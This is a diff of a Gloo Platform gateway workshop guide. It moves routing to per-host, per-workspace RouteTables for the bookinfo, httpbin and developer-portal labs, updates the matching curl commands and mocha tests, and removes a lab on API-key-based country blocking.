         routeTables:
           - labels:
               expose: "true"
+            workspace: bookinfo
+          - labels:
+              expose: "true"
+            workspace: gateways
+        sortMethod: ROUTE_SPECIFICITY
+---
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: main-httpbin
+  namespace: istio-gateways
+spec:
+  hosts:
+    - cluster1-httpbin.example.com
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: root
+      matchers:
+      - uri:
+          prefix: /
+      delegate:
+        routeTables:
+          - labels:
+              expose: "true"
+            workspace: httpbin
         sortMethod: ROUTE_SPECIFICITY
 EOF
 ```
@@ -2304,7 +2363,7 @@ In this example we will block requests that originate in a certain country. This
 Before we get started, we'll need to patch the ingress gateway so that it can use the lookup database of countries and IP addresses. We'll also need to patch the gateway service to preserve the client IP address, so that the true source is used for the lookup. The following commands apply the patches:
 
 ```bash
-kubectl --context ${CLUSTER1} -n istio-gateways patch deployment $(kubectl --context ${CLUSTER1} -n istio-gateways get deploy -l istio=ingressgateway -o jsonpath='{.items[0].metadata.name}') --patch-file data/steps/gateway-geoblock/gateway-patch.yaml
+kubectl --context ${CLUSTER1} -n istio-gateways patch deployment $(kubectl --context ${CLUSTER1} -n istio-gateways get deploy -l istio=ingressgateway -o jsonpath='{.items[0].metadata.name}') --patch-file /root/files/gateway-geoip-patch.yaml
 kubectl --context ${CLUSTER1} -n istio-gateways patch svc $(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[0].metadata.name}') -p '{"spec":{"externalTrafficPolicy":"Local"}}'
 ```
 
@@ -2354,11 +2413,11 @@ kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: RouteTable
 metadata:
-  name: main
+  name: main-httpbin
   namespace: istio-gateways
 spec:
   hosts:
-    - '*'
+    - cluster1-httpbin.example.com
   virtualGateways:
     - name: north-south-gw
       namespace: istio-gateways
@@ -2375,6 +2434,7 @@ spec:
         routeTables:
           - labels:
               expose: "true"
+            workspace: httpbin
         sortMethod: ROUTE_SPECIFICITY
 EOF
 ```
@@ -2437,11 +2497,12 @@ kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: RouteTable
 metadata:
-  name: main
+  name: main-bookinfo
   namespace: istio-gateways
 spec:
   hosts:
-    - '*'
+    - cluster1-bookinfo.example.com
+    - cluster2-bookinfo.example.com
   virtualGateways:
     - name: north-south-gw
       namespace: istio-gateways
@@ -2456,6 +2517,35 @@ spec:
         routeTables:
           - labels:
               expose: "true"
+            workspace: bookinfo
+          - labels:
+              expose: "true"
+            workspace: gateways
+        sortMethod: ROUTE_SPECIFICITY
+---
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: main-httpbin
+  namespace: istio-gateways
+spec:
+  hosts:
+    - cluster1-httpbin.example.com
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: root
+      matchers:
+      - uri:
+          prefix: /
+      delegate:
+        routeTables:
+          - labels:
+              expose: "true"
+            workspace: httpbin
         sortMethod: ROUTE_SPECIFICITY
 EOF
 ```
@@ -2469,7 +2559,7 @@ kubectl --context ${CLUSTER1} -n httpbin delete wafpolicies.security.policy.gloo
 And finally, revert the patches to the ingress gateway and gateway service:
 
 ```bash
-kubectl --context ${CLUSTER1} -n istio-gateways patch deployment $(kubectl --context ${CLUSTER1} -n istio-gateways get deploy -l istio=ingressgateway -o jsonpath='{.items[0].metadata.name}') --type json --patch-file data/steps/gateway-geoblock/gateway-patch-revert.json
+kubectl --context ${CLUSTER1} -n istio-gateways patch deployment $(kubectl --context ${CLUSTER1} -n istio-gateways get deploy -l istio=ingressgateway -o jsonpath='{.items[0].metadata.name}') --type json --patch-file /root/files/gateway-geoip-patch-revert.json
 kubectl --context ${CLUSTER1} -n istio-gateways patch svc $(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[0].metadata.name}') -p '{"spec":{"externalTrafficPolicy":"Cluster"}}'
 ```
 
@@ -2644,7 +2734,7 @@ You can think about this `RouteTable` as an API product. Also, note that we defi
 You should now be able to access the API through the gateway without any authentication:
 
 ```shell
-curl -k "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/api/bookinfo/v1"
+curl -k "https://cluster1-bookinfo.example.com/api/bookinfo/v1"
 ```
 
 <!--bash
@@ -2652,7 +2742,7 @@ cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
 describe("Access the API without authentication", () => {
-  it('Checking text \'The Comedy of Errors\' in the response', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/api/bookinfo/v1', body: 'The Comedy of Errors', match: true }));
+  it('Checking text \'The Comedy of Errors\' in the response', () => helpersHttp.checkBody({ host: `https://cluster1-bookinfo.example.com`, path: '/api/bookinfo/v1', body: 'The Comedy of Errors', match: true }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-no-auth.test.js.liquid"
@@ -2707,7 +2797,7 @@ This policy will be attached to our `RouteTable` due to the label `apikeys: "tru
 Try to access the API without authentication:
 
 ```shell
-curl -k "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/api/bookinfo/v1" -I
+curl -k "https://cluster1-bookinfo.example.com/api/bookinfo/v1" -I
 ```
 
 <!--bash
@@ -2715,7 +2805,7 @@ cat <<'EOF' > ./test.js
 const helpers = require('./tests/chai-http');
 
 describe("Access to API unauthorized", () => {
-  it('Response code is 401', () => helpers.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/api/bookinfo/v1', retCode: 401 }));
+  it('Response code is 401', () => helpers.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 401 }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-unauthorized.test.js.liquid"
@@ -2757,7 +2847,7 @@ EOF
 Now, you should be able to access the API using this API key:
 
 ```shell
-curl -k -H "api-key: ${API_KEY_USER1}" "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/api/bookinfo/v1"
+curl -k -H "api-key: ${API_KEY_USER1}" "https://cluster1-bookinfo.example.com/api/bookinfo/v1"
 ```
 
 <!--bash
@@ -2765,7 +2855,7 @@ cat <<'EOF' > ./test.js
 const helpers = require('./tests/chai-http');
 
 describe("Access to API authorized", () => {
-  it('Response code is 200', () => helpers.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY_USER1}], retCode: 200 }));
+  it('Response code is 200', () => helpers.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY_USER1}], retCode: 200 }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-authorized.test.js.liquid"
@@ -2876,7 +2966,7 @@ This policy will be attached to our `RouteTable` due to the label `ratelimited: 
 Try to access the API more than 5 times:
 
 ```shell
-for i in `seq 1 10`; do curl -k -H "api-key: ${API_KEY_USER1}" "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/api/bookinfo/v1" -I; done
+for i in `seq 1 10`; do curl -k -H "api-key: ${API_KEY_USER1}" "https://cluster1-bookinfo.example.com/api/bookinfo/v1" -I; done
 ```
 
 You should be rate limited:
@@ -3061,7 +3151,7 @@ You can think about this `RouteTable` as the same API product as the one we've c
 You can check the new path is available:
 
 ```shell
-curl -k -H "api-key: ${API_KEY_USER1}" "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/api/bookinfo/v2/search.json?title=The%20Comedy%20of%20Errors&fields=language&limit=1"
+curl -k -H "api-key: ${API_KEY_USER1}" "https://cluster1-bookinfo.example.com/api/bookinfo/v2/search.json?title=The%20Comedy%20of%20Errors&fields=language&limit=1"
 ```
 
 <!--bash
@@ -3069,7 +3159,7 @@ cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
 describe("Access the openlibrary API", () => {
-  it('Checking text \'language\' in the response', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/api/bookinfo/v2/search.json?title=The%20Comedy%20of%20Errors&fields=language&limit=1', headers: [{key: 'api-key', value: process.env.API_KEY_USER1}], body: 'language', match: true }));
+  it('Checking text \'language\' in the response', () => helpersHttp.checkBody({ host: `https://cluster1-bookinfo.example.com`, path: '/api/bookinfo/v2/search.json?title=The%20Comedy%20of%20Errors&fields=language&limit=1', headers: [{key: 'api-key', value: process.env.API_KEY_USER1}], body: 'language', match: true }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api.test.js.liquid"
@@ -3118,7 +3208,7 @@ Note we've also exposed the `/authors/{olid}.json` path to demonstrate how we ca
 You can try it out with the following command:
 
 ```shell
-curl -k -H "api-key: ${API_KEY_USER1}" "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/api/bookinfo/v2/authors/OL23919A.json"
+curl -k -H "api-key: ${API_KEY_USER1}" "https://cluster1-bookinfo.example.com/api/bookinfo/v2/authors/OL23919A.json"
 ```
 
 
@@ -3135,7 +3225,39 @@ Two components are serving this purpose:
 
 In this lab, we're going to setup the Gloo Platform portal backend.
 
-We need to expose the portal API through Ingress Gateway using a `RouteTable`:
+The Gateway team should create a parent `RouteTable` for the portal.
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: main-portal
+  namespace: istio-gateways
+spec:
+  hosts:
+    - cluster1-portal.example.com
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: root
+      matchers:
+      - uri:
+          prefix: /
+      delegate:
+        routeTables:
+          - labels:
+              expose: "true"
+              portal: "true"
+            workspace: gateways
+        sortMethod: ROUTE_SPECIFICITY
+EOF
+```
+
+After that, you can expose the portal API through Ingress Gateway using a `RouteTable`:
 
 ```bash
 kubectl apply --context ${CLUSTER1} -f - <<EOF
@@ -3146,6 +3268,7 @@ metadata:
   namespace: gloo-mesh-addons
   labels:
     expose: "true"
+    portal: "true"
 spec:
   defaultDestination:
     ref:
@@ -3157,9 +3280,20 @@ spec:
   http:
     - forwardTo:
         pathRewrite: /v1
+      name: authn-api-and-usage-plans-access-token
+      labels:
+        oauth: "access-token"
+        route: portal-api
+      matchers:
+        - uri:
+            prefix: /portal-server/v1
+          headers:
+            - name: Authorization
+    - forwardTo:
+        pathRewrite: /v1
       name: authn-api-and-usage-plans
       labels:
-        oauth: "true"
+        oauth: "authorization-code"
         route: portal-api
       matchers:
         - uri:
@@ -3179,11 +3313,16 @@ spec:
             prefix: /portal-server/v1
 EOF
 ```
+Make sure the domain is in our `/etc/hosts` file:
+
+```bash
+./scripts/register-domain.sh cluster1-portal.example.com ${HOST_GW_CLUSTER1}
+```
 
 You should now be able to access the portal API through the gateway without any authentication:
 
 ```shell
-curl -k "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/portal-server/v1/apis"
+curl -k "https://cluster1-portal.example.com/portal-server/v1/apis"
 ```
 
 <!--bash
@@ -3191,7 +3330,7 @@ cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
 describe("Access the portal API without authentication", () => {
-  it('Checking text \'portal config not found\' in the response', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/portal-server/v1/apis', body: 'portal config not found', match: true }));
+  it('Checking text \'portal config not found\' in the response', () => helpersHttp.checkBody({ host: `https://cluster1-portal.example.com`, path: '/portal-server/v1/apis', body: 'portal config not found', match: true }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/bookinfo/dev-portal-backend/tests/access-portal-api-no-auth-no-config.test.js.liquid"
@@ -3243,7 +3382,7 @@ EOF
 Try again to access the API:
 
 ```shell
-curl -k "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/portal-server/v1/apis"
+curl -k "https://cluster1-portal.example.com/portal-server/v1/apis"
 ```
 
 <!--bash
@@ -3251,7 +3390,7 @@ cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
 describe("Access the portal API without authentication", () => {
-  it('Checking text \'null\' in the response', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/portal-server/v1/apis', body: '[]', match: true }));
+  it('Checking text \'null\' in the response', () => helpersHttp.checkBody({ host: `https://cluster1-portal.example.com`, path: '/portal-server/v1/apis', body: '[]', match: true }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/bookinfo/dev-portal-backend/tests/access-portal-api-no-auth-empty.test.js.liquid"
@@ -3359,7 +3498,7 @@ spec:
             port: 4000
         env:
         - name: VITE_PORTAL_SERVER_URL
-          value: "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/portal-server/v1"
+          value: "https://cluster1-portal.example.com/portal-server/v1"
         - name: VITE_APPLIED_OIDC_AUTH_CODE_CONFIG
           value: "true"
         - name: VITE_OIDC_AUTH_CODE_CONFIG_CALLBACK_PATH
@@ -3380,6 +3519,7 @@ metadata:
   namespace: gloo-mesh-addons
   labels:
     expose: "true"
+    portal: "true"
 spec:
   http:
     - name: portal-frontend-auth
@@ -3392,7 +3532,7 @@ spec:
               namespace: gloo-mesh-addons
               cluster: cluster1
       labels:
-        oauth: "true"
+        oauth: "authorization-code"
         route: portal-api
       matchers:
         - uri:
@@ -3419,7 +3559,7 @@ cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
 describe("Access the portal frontend without authentication", () => {
-  it('Checking text \'Developer Portal\' in the response', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/index.html', body: 'Developer Portal', match: true }));
+  it('Checking text \'Developer Portal\' in the response', () => helpersHttp.checkBody({ host: `https://cluster1-portal.example.com`, path: '/index.html', body: 'Developer Portal', match: true }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-frontend-no-auth.test.js.liquid"
@@ -3436,7 +3576,7 @@ If you click on the `VIEW APIS` button, you won't see any API because we haven't
 
 Get the URL to access the portal frontend using the following command:
 ```
-echo "https://${ENDPOINT_HTTPS_GW_CLUSTER1}"
+echo "https://cluster1-portal.example.com"
 ```
 
 But we need to secure the access to the portal frontend.
@@ -3469,7 +3609,7 @@ spec:
   applyToRoutes:
   - route:
       labels:
-        oauth: "true"
+        oauth: "authorization-code"
   config:
     server:
       name: ext-auth-server
@@ -3479,7 +3619,7 @@ spec:
       configs:
       - oauth2:
           oidcAuthorizationCode:
-            appUrl: "https://${ENDPOINT_HTTPS_GW_CLUSTER1}"
+            appUrl: "https://cluster1-portal.example.com"
             callbackPath: /v1/login
             clientId: ${KEYCLOAK_CLIENT}
             clientSecretRef:
@@ -3512,6 +3652,7 @@ metadata:
   namespace: gloo-mesh-addons
   labels:
     expose: "true"
+    portal: "true"
 spec:
   defaultDestination:
     ref:
@@ -3587,7 +3728,7 @@ describe("Authentication is working properly", function() {
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
   let keycloak_client_secret = buff.toString('ascii');
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it("The portal frontend is accessible after authenticating", () => helpersHttp.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/index.html', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 }));
+  it("The portal frontend is accessible after authenticating", () => helpersHttp.checkURL({ host: `https://cluster1-portal.example.com`, path: '/index.html', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 }));
 });
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-frontend-authenticated.test.js.liquid"
@@ -3606,198 +3747,7 @@ Now, if you click on the `VIEW APIS` button, you should see the `Bookinfo REST A
 
 
 
-## Lab 23 - Validate user information with API key metadata and an external service <a name="lab-23---validate-user-information-with-api-key-metadata-and-an-external-service-"></a>
-
-
-In this lab, we will explore how to expose information from the API key and use it to authorize requests.
-
-Specifically, we'll store a list of prohibited countries in the metadata of the API key, and then enforce that requests must come from a country not on that list the be successfully authorized.
-
-First, identify the two-character ISO 3166-1 code representing the country you're in. We'll use this in the API key's metadata. For example, use `US` for the USA, or `GB` for the United Kingdom. A comprehensive collection of country codes is in [this list](https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2#Officially_assigned_code_elements).
-
-Set your country code in an environment variable (replace `GB` with your own):
-
-```bash
-export PROHIBITED_COUNTRY=GB
-```
-
-Add this country as a "prohibited country" in the metadata of user1's API key:
-
-```bash
-export API_KEY_USER1=apikey1
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: v1
-kind: Secret
-metadata:
-  name: user1
-  namespace: bookinfo-frontends
-  labels:
-    auth: api-key
-type: extauth.solo.io/apikey
-stringData:
-  api-key: $(echo -n "${API_KEY_USER1}")
-  user-id: user1
-  user-email: user1@solo.io
-  usagePlan: gold
-  prohibitedCountries: $(echo -n "${PROHIBITED_COUNTRY}")
-EOF
-```
-
-We'll configure the `ExtAuthPolicy` to do a few things:
- - Add the API key's list of prohibited countries to the request when authenticating the key
- - Add the request's originating country to the request metadata (implemented by an external service)
- - Compare the requestor country with the list of prohibited countries using an OPA rule
-
-The OPA rule will cause authorization to fail if the requestor country is in the list of prohibited countries. We'll create this rule first:
-
-```bash
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: deny-prohibited-countries
-  namespace: bookinfo-frontends
-data:
-  policy.rego: |-
-    package test
-
-    import future.keywords.if
-    import future.keywords.in
-
-    default allow = false
-
-    allow if not input.state["X-AppConfig-Prohibited-Countries"]
-
-    allow if not input.state["geo-CountryCode"]
-
-    allow if input.state["geo-CountryCode"] == ""
-
-    allow if {
-        not input.state["geo-CountryCode"] in split(input.state["X-AppConfig-Prohibited-Countries"], ",")
-    }
-EOF
-```
-
-Let's also create the external service that will perform the country code lookup for requests as they arrive:
-
-```bash
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: extauth-grpcservice
-  namespace: gloo-mesh-addons
-spec:
-  selector:
-    matchLabels:
-      app: grpc-extauth
-  replicas: 1
-  template:
-    metadata:
-      labels:
-        app: grpc-extauth
-    spec:
-      containers:
-      - name: grpc-extauth
-        image: gcr.io/field-engineering-eu/jesus-passthrough-grpc-service:0.2.6
-        imagePullPolicy: Always
-        ports:
-        - containerPort: 9001
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: example-grpc-auth-service
-  namespace: gloo-mesh-addons
-  labels:
-      app: grpc-extauth
-spec:
-  ports:
-  - port: 9001
-    protocol: TCP
-  selector:
-      app: grpc-extauth
-EOF
-```
-
-Then we can apply the `ExtAuthPolicy`:
-
-```bash
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: security.policy.gloo.solo.io/v2
-kind: ExtAuthPolicy
-metadata:
-  name: bookinfo-apiauth
-  namespace: bookinfo-frontends
-spec:
-  applyToRoutes:
-  - route:
-      labels:
-        apikeys: "true"
-  config:
-    server:
-      name: ext-auth-server
-      namespace: gloo-mesh-addons
-      cluster: cluster1
-    glooAuth:
-      configs:
-      - apiKeyAuth:
-          headerName: api-key
-          headersFromMetadataEntry:
-            X-AppConfig-Prohibited-Countries:
-              name: prohibitedCountries
-          k8sSecretApikeyStorage:
-            labelSelector:
-              auth: api-key
-      - passThroughAuth:
-          grpc:
-            address: example-grpc-auth-service.gloo-mesh-addons.svc.cluster.local:9001
-      - opaAuth:
-          modules:
-          - name: deny-prohibited-countries
-            namespace: bookinfo-frontends
-          query: "data.test.allow == true"
-EOF
-```
-
-Let's test that the API key's prohibited country list is enforced. We'll do this by using the Swagger API documentation in the portal to send a test request to the API itself.
-
-In the Portal UI, make sure you're logged in as "user1" and click the "**APIs**" menu item. Select "**BookInfo REST API**", click to switch to the "**Swagger View**", then click "**Authorize**" and enter our API key, `apikey1`.
-
-Now, pick a resource to test. For example, use "**GET /api/bookinfo/v1**" and click "**Try it out**", then "**Execute**". This will send a request through our authorization flow using the API key that we've added metadata to. We should see a server response of `403 Error: Forbidden`, as the authorization server has rejected your request on the basis of the country your requests are coming from.
-
-Let's update the API key so that it blocks requests from a different country. Set the prohibited country to the code of a country you're *not* in:
-
-```bash
-export PROHIBITED_COUNTRY=KP #North Korea
-```
-
-Now update the API key with this restriction:
-
-```bash
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: v1
-kind: Secret
-metadata:
-  name: user1
-  namespace: bookinfo-frontends
-  labels:
-    auth: api-key
-type: extauth.solo.io/apikey
-stringData:
-  api-key: $(echo -n "${API_KEY_USER1}")
-  user-id: user1
-  user-email: user1@solo.io
-  usagePlan: gold
-  prohibitedCountries: $(echo -n "${PROHIBITED_COUNTRY}")
-EOF
-```
-
-Finally, repeat the test API call in the Swagger UI. This time you should see code `200` and a successful response.
-
-
-
-## Lab 24 - Allow users to create their own API keys <a name="lab-24---allow-users-to-create-their-own-api-keys-"></a>
+## Lab 23 - Allow users to create their own API keys <a name="lab-23---allow-users-to-create-their-own-api-keys-"></a>
 [<img src="https://img.youtube.com/vi/fipCEZqijcQ/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/fipCEZqijcQ "Video Link")
 
 
@@ -3862,7 +3812,7 @@ export KEYCLOAK_URL=http://${ENDPOINT_KEYCLOAK}
 KEYCLOAK_CLIENT_ID=$(kubectl --context ${CLUSTER1} -n gloo-mesh-addons get extauthpolicy portal -o jsonpath='{.spec.config.glooAuth.configs[0].oauth2.oidcAuthorizationCode.clientId}')
 KEYCLOAK_CLIENT_SECRET=$(kubectl --context ${CLUSTER1} -n gloo-mesh-addons get secret oauth -o jsonpath='{.data.client-secret}' | base64 --decode)
 KEYCLOAK_USER1_TOKEN=$(curl -d "client_id=${KEYCLOAK_CLIENT_ID}" -d "client_secret=${KEYCLOAK_CLIENT_SECRET}" -d "scope=openid" -d "username=user1" -d "password=password" -d "grant_type=password" "${KEYCLOAK_URL}/realms/master/protocol/openid-connect/token" | jq -r '.id_token')
-export API_KEY_USER1=$(curl -k -s -X POST -H 'Content-Type: application/json' -d '{"usagePlan": "gold", "apiKeyName": "key1"}' -H "id_token: ${KEYCLOAK_USER1_TOKEN}" "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/portal-server/v1/api-keys"  | jq -r '.apiKey')
+export API_KEY_USER1=$(curl -k -s -X POST -H 'Content-Type: application/json' -d '{"usagePlan": "gold", "apiKeyName": "key1"}' -H "id_token: ${KEYCLOAK_USER1_TOKEN}" "https://cluster1-bookinfo.example.com/portal-server/v1/api-keys"  | jq -r '.apiKey')
 echo API key: $API_KEY_USER1
 ```
 
@@ -3871,7 +3821,7 @@ cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
 describe("API key creation working properly", function() {
-  it("Authentication is working with the generated API key", () => helpersHttp.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY_USER1}], retCode: 200 }));
+  it("Authentication is working with the generated API key", () => helpersHttp.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY_USER1}], retCode: 200 }));
 });
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/api-key.test.js.liquid"
@@ -3882,7 +3832,7 @@ mocha ./test.js --timeout 10000 --retries=150 --bail 2> ${tempfile} || { cat ${t
 
 
 
-## Lab 25 - Dev portal monetization <a name="lab-25---dev-portal-monetization-"></a>
+## Lab 24 - Dev portal monetization <a name="lab-24---dev-portal-monetization-"></a>
 [<img src="https://img.youtube.com/vi/VTvQ7YQi2eA/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/VTvQ7YQi2eA "Video Link")
 
 
@@ -3964,7 +3914,7 @@ Note that you can also configure the access logs when deploying Istio with the `
 After that, you can send an API call:
 
 ```bash
-curl -k -H "api-key: ${API_KEY_USER1}" "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/api/bookinfo/v1"
+curl -k -H "api-key: ${API_KEY_USER1}" "https://cluster1-bookinfo.example.com/api/bookinfo/v1"
 ```
 
 Now, let's check the logs of the Istio Ingress Gateway:
@@ -4110,7 +4060,7 @@ const helpers = require('./tests/chai-exec');
 
 describe("Monetization is working", () => {
   it('Response contains all the required monetization fields', () => {
-    const response = helpers.getOutputForCommand({ command: "curl -k -H 'api-key: " + process.env.API_KEY_USER1 + "' https://" + process.env.ENDPOINT_HTTPS_GW_CLUSTER1 + "/api/bookinfo/v1" });
+    const response = helpers.getOutputForCommand({ command: `curl -k -H 'api-key: ${process.env.API_KEY_USER1}' https://cluster1-bookinfo.example.com/api/bookinfo/v1` });
     const output = JSON.parse(helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n istio-gateways logs -l istio=ingressgateway --tail 1" }));
     expect(output.usage_plan).to.equals("gold");
     expect(output.api_product_id).to.equals("bookinfo");
